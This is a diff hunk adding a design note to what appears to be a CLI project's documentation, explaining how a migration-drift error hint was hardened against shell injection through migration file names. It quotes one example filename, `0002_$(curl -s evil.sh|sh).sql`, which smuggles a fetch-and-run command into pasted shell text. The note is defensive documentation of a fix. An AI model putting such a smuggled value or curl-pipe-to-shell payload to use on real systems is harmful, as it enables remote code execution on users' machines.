@@ -1403,6 +1403,14 @@ survives the round trip whole.
   and the name is read off `cause`/`meta` instead. Every benign rendering is byte-identical: the
   screen sits on the refusal branch alone, because roughly ten pages across `packages/cli`,
   `packages/core`, `wiki/` and `docs/` quote `x db gen "add <name>"` verbatim.
+  **`unknownSchema` was the one finding in that file that never ran it, until 2026-09-06.** Its
+  `fix:` splices a migration id into `git checkout -- "*<id>.snapshot.json"` and a migration name
+  into `x db gen "<name>"`, both inside shell double quotes — and both are FILENAME text
+  (`parseMigrationSql` takes the id off the file and derives the name from it), so a migration
+  called `0002_$(curl -s evil.sh|sh).sql` built a line that runs on paste. Screened and degraded
+  to prose like its neighbours; an **empty** id keeps its glob, because `""` substitutes nothing
+  and that case is "no migrations at all" rather than a name the screen refused
+  (`drift-findings.test.ts`).
 
 - **`dbDrift()` lives in `drift-errors.ts` and not in `errors.ts`, for exactly the reason
   `dependent-view.ts` states.** Its `fix:` needs `shellInertIdentifier` and `sql.ts` imports
